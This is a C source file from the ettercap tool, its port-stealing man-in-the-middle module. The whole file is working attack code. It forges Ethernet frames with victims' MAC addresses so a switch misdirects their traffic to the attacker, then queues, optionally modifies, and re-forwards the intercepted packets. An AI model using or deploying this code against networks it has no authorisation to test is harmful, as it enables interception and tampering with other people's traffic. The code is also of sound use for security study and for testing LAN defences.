/*
    ettercap -- Port Stealing mitm module

    Copyright (C) ALoR & NaGA

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

    $Id: ec_port_stealing.c,v 1.15 2004/11/04 09:23:02 alor Exp $
*/

#include <ec.h>
#include <ec_mitm.h>
#include <ec_send.h>
#include <ec_threads.h>
#include <ec_ui.h>
#include <ec_hook.h>


/* globals */
struct packet_list {
   struct packet_object *po;
   TAILQ_ENTRY(packet_list) next;
};


struct steal_list {
   struct ip_addr ip;
   u_char mac[MEDIA_ADDR_LEN];
   u_char wait_reply;
   TAILQ_HEAD(, packet_list) packet_table;
   LIST_ENTRY(steal_list) next;
};

LIST_HEAD(, steal_list) steal_table;
static int steal_tree;

struct eth_header
{
   u_int8   dha[ETH_ADDR_LEN];       /* destination eth addr */
   u_int8   sha[ETH_ADDR_LEN];       /* source ether addr */
   u_int16  proto;                   /* packet type ID field */
};

struct arp_header {
   u_int16  ar_hrd;          /* Format of hardware address.  */
   u_int16  ar_pro;          /* Format of protocol address.  */
   u_int8   ar_hln;          /* Length of hardware address.  */
   u_int8   ar_pln;          /* Length of protocol address.  */
   u_int16  ar_op;           /* ARP opcode (command).  */
#define ARPOP_REQUEST   1    /* ARP request.  */
};

struct arp_eth_header {
   u_int8   arp_sha[MEDIA_ADDR_LEN];     /* sender hardware address */
   u_int8   arp_spa[IP_ADDR_LEN];      /* sender protocol address */
   u_int8   arp_tha[MEDIA_ADDR_LEN];     /* target hardware address */
   u_int8   arp_tpa[IP_ADDR_LEN];      /* target protocol address */
};

#define FAKE_PCK_LEN sizeof(struct eth_header)+sizeof(struct arp_header)+sizeof(struct arp_eth_header)
struct packet_object fake_po;
char fake_pck[FAKE_PCK_LEN];


/* protos */

void port_stealing_init(void);
EC_THREAD_FUNC(port_stealer);
static int port_stealing_start(char *args);
static void port_stealing_stop(void);
static void parse_received(struct packet_object *po);
static void put_queue(struct packet_object *po);
static void send_queue(struct packet_object *po);


/*******************************************/

/*
 * this function is the initializer.
 * it adds the entry in the table of registered mitm
 */

void __init port_stealing_init(void)
{
   struct mitm_method mm;

   mm.name = "port";
   mm.start = &port_stealing_start;
   mm.stop = &port_stealing_stop;
   
   mitm_add(&mm);
}


/*
 * init the PORT STEALING attack
 */
static int port_stealing_start(char *args)
{     
   struct hosts_list *h;
   struct steal_list *s;
   struct eth_header *heth;
   struct arp_header *harp;
   char *p;
   char bogus_mac[6]="\x00\xe7\x7e\xe7\x7e\xe7";
   
   DEBUG_MSG("port_stealing_start");
   USER_MSG("\nPort Stealing: starting...\n\n");

   steal_tree = 0;

   /* parse the args only if not empty */
   if (strcmp(args, "")) {
      for (p = strsep(&args, ","); p != NULL; p = strsep(&args, ",")) {
         if (!strcasecmp(p, "remote")) {
            /* 
            * allow sniffing of remote host even 
            * if the target is local (used for gw)
            */
            GBL_OPTIONS->remote = 1;
         } else if (!strcasecmp(p, "tree")) {
            steal_tree = 1; 
         } else {
            SEMIFATAL_ERROR("Port Stealing: paramenter incorrect.\n");
         }
      }
   }
 
   /* Port Stealing works only on ethernet switches */
   if (GBL_PCAP->dlt != IL_TYPE_ETH)
      SEMIFATAL_ERROR("Port Stealing does not support this media.\n");

   if (LIST_EMPTY(&GBL_HOSTLIST)) 
      SEMIFATAL_ERROR("Port stealing needs a non empty hosts list.\n");
      
   /* Avoid sniffing loops. XXX - it remains even after mitm stopping */
   capture_only_incoming(GBL_PCAP->pcap, GBL_LNET->lnet);
      
   /* Create the port stealing list from hosts list */   
   LIST_FOREACH(h, &GBL_HOSTLIST, next) {
      /* create the element and insert it in steal lists */
      SAFE_CALLOC(s, 1, sizeof(struct steal_list));
      memcpy(&s->ip, &h->ip, sizeof(struct ip_addr));
      memcpy(s->mac, h->mac, MEDIA_ADDR_LEN);
      TAILQ_INIT(&s->packet_table);
      LIST_INSERT_HEAD(&steal_table, s, next);
   }

   /* Create the packet that will be sent for stealing. 
    * This is a fake ARP request. 
    */
   heth = (struct eth_header *)fake_pck;
   harp = (struct arp_header *)(heth + 1);

   /* If we use our MAC address we won't generate traffic
    * flooding on the LAN but we will reach only direct
    * connected switch with the stealing process 
    */
   if (steal_tree)
      memcpy(heth->dha, bogus_mac, ETH_ADDR_LEN);
   else
      memcpy(heth->dha, GBL_IFACE->mac, ETH_ADDR_LEN);

   heth->proto = htons(LL_TYPE_ARP);
   harp->ar_hrd = htons(ARPHRD_ETHER);
   harp->ar_pro = htons(ETHERTYPE_IP);
   harp->ar_hln = 6;
   harp->ar_pln = 4;
   harp->ar_op  = htons(ARPOP_REQUEST);

   packet_create_object(&fake_po, fake_pck, FAKE_PCK_LEN);
   
   /* Add the hooks:
    * - handle stealed packets (mark it as forwardable)
    * - put the packet in the send queue after "filtering" (send arp request, stop stealing)
    * - send the queue on arp reply (port restored, restart stealing)
    */
   hook_add(HOOK_PACKET_ETH, &parse_received);
   hook_add(HOOK_PRE_FORWARD, &put_queue);
   hook_add(HOOK_PACKET_ARP_RP, &send_queue);
   
   /* create the stealing thread */
   ec_thread_new("port_stealer", "Port Stealing module", &port_stealer, NULL);

   return ESUCCESS;
}


/*
 * shut down the poisoning process
 */
static void port_stealing_stop(void)
{
   pthread_t pid;
   struct steal_list *s, *tmp_s = NULL;
   struct packet_list *p, *tmp_p = NULL;

   int i;
      
   DEBUG_MSG("port_stealing_stop");
   
   /* destroy the poisoner thread */
   pid = ec_thread_getpid("port_stealer");
   
   /* the thread is active or not ? */
   if (!pthread_equal(pid, EC_PTHREAD_NULL))
      ec_thread_destroy(pid);
   else
      return;
   
   /* Remove the Hooks */
   hook_del(HOOK_PACKET_ETH, &parse_received);
   hook_del(HOOK_PRE_FORWARD, &put_queue);
   hook_del(HOOK_PACKET_ARP_RP, &send_queue);
        
   USER_MSG("Prot Stealing deactivated.\n");
   USER_MSG("Restoring Switch tables...\n");
  
   ui_msg_flush(2);

   /* Restore Switch Tables (2 times) 
    * by sending arp requests.
    */
   for (i=0; i<2; i++) {
      LIST_FOREACH(s, &steal_table, next) {
         send_arp(ARPOP_REQUEST, &GBL_IFACE->ip, GBL_IFACE->mac, &s->ip, MEDIA_BROADCAST);
         usleep(GBL_CONF->arp_storm_delay * 1000);  
      }      
   }
   
   /* Free the stealing list */
   LIST_FOREACH_SAFE(s, &steal_table, next, tmp_s) {
   
      /* Free the sending queue for each host */
      TAILQ_FOREACH_SAFE(p, &s->packet_table, next, tmp_p) {
         packet_destroy_object(p->po);
         TAILQ_REMOVE(&s->packet_table, p, next);
         SAFE_FREE(p->po);
         SAFE_FREE(p);
      }
      
      LIST_REMOVE(s, next);
      SAFE_FREE(s);
   }
}


/*
 * the real Port Stealing thread
 */
EC_THREAD_FUNC(port_stealer)
{
   struct steal_list *s;
   struct eth_header *heth;
   
   /* init the thread and wait for start up */
   ec_thread_init();
  
   heth = (struct eth_header *)fake_pck;
  
   /* never ending loop */
   LOOP {
      
      CANCELLATION_POINT();
      
      /* Walk the list and steal the ports */
      LIST_FOREACH(s, &steal_table, next) {
         /* Steal only ports for hosts where no packet is in queue */
         if (!s->wait_reply) {
            memcpy(heth->sha, s->mac, ETH_ADDR_LEN);
            send_to_L2(&fake_po); 
            usleep(GBL_CONF->port_steal_delay * 1000);  
         }
      }      
      usleep(GBL_CONF->port_steal_delay * 1000);
   }
   
   return NULL; 
}

/* Check if it's a stolen packet */
static void parse_received(struct packet_object *po)
{
   struct steal_list *s;

   /* If the dest MAC is in the stealing list
    * mark the packet as forwardable
    */
   LIST_FOREACH(s, &steal_table, next) {
      if (!memcmp(po->L2.dst, s->mac, ETH_ADDR_LEN)) {
         po->flags |= PO_FORWARDABLE;
         break;
      }
   }
}

/* If the packet was stolen put it in the sending
 * queue waiting for the port-restoring arp reply
 */
static void put_queue(struct packet_object *po)
{
   struct steal_list *s;
   struct packet_list *p;

   if (po->flags & PO_DROPPED)
      return;
      
   LIST_FOREACH(s, &steal_table, next) {
      if (!memcmp(po->L2.dst, s->mac, ETH_ADDR_LEN)) {
           
         /* If the packet was not dropped stop the stealing
          * thread for this address, send the arp request
          * and put a duplicate in the host sending queue
          */
         if (!s->wait_reply) {
            s->wait_reply = 1;
            send_arp(ARPOP_REQUEST, &GBL_IFACE->ip, GBL_IFACE->mac, &s->ip, MEDIA_BROADCAST);
         }

         SAFE_CALLOC(p, 1, sizeof(struct packet_list));

         /* If it's a L3 packet we have to adjust
          * raw packet len for L2 sending (just in
          * case of filters' modifications)
          */
         if (po->fwd_packet) 
            po->len = po->fwd_len + sizeof(struct eth_header);
		  
         p->po = packet_dup(po, PO_DUP_PACKET);
         TAILQ_INSERT_TAIL(&(s->packet_table), p, next);
	   
         /* Avoid standard forwarding method */
         po->flags |= PO_DROPPED;
         break;
      }
   }
}

/* If we was waiting this reply from stolen host
 * send its sending queue and restart stealing process
 */
static void send_queue(struct packet_object *po)
{
   struct steal_list *s1, *s2;
   struct packet_list *p, *tmp = NULL;
   struct eth_header *heth;
   int in_list, to_wait = 0;

   /* Check if it's an arp reply for us */
   if (memcmp(po->L2.dst, GBL_IFACE->mac, MEDIA_ADDR_LEN))
      return;
      
   LIST_FOREACH(s1, &steal_table, next) {
      if (!memcmp(po->L2.src, s1->mac, ETH_ADDR_LEN)) {
         /* If we was waiting for the reply it means
          * that there is a queue to be sent
          */
         if (s1->wait_reply) {
            /* Send the packet queue (starting from 
             * the first received packet)
             */
            TAILQ_FOREACH_SAFE(p, &s1->packet_table, next, tmp) {
               /* If the source of the packet to send is not in the 
                * stealing list, change the MAC address with ours
                */
               in_list = 0;
               LIST_FOREACH(s2, &steal_table, next) {
                  if (!memcmp(p->po->L2.src, s2->mac, ETH_ADDR_LEN)) {
                     in_list = 1;
                     break;
                  }
               }

               if (!in_list) {
                  heth = (struct eth_header *)p->po->packet;
                  /* Paranoid test */
                  if (p->po->len >= sizeof(struct eth_header))
                     memcpy(heth->sha, GBL_IFACE->mac, ETH_ADDR_LEN);
               }

               /* Send the packet on the wire */
               send_to_L2(p->po);

               /* Destroy the packet duplicate and remove 
                * it from the queue
                */
               packet_destroy_object(p->po);
               TAILQ_REMOVE(&s1->packet_table, p, next);
               SAFE_FREE(p->po);
               SAFE_FREE(p);
	      
               /* Sleep only if we have more than one packet to send */
               if (to_wait) 
                  usleep(GBL_CONF->port_steal_send_delay);
               to_wait = 1;
            }
            /* Restart the stealing process for this host */
            s1->wait_reply = 0;
         }
         break;
      }
   }
}


/* EOF */

// vim:ts=3:expandtab

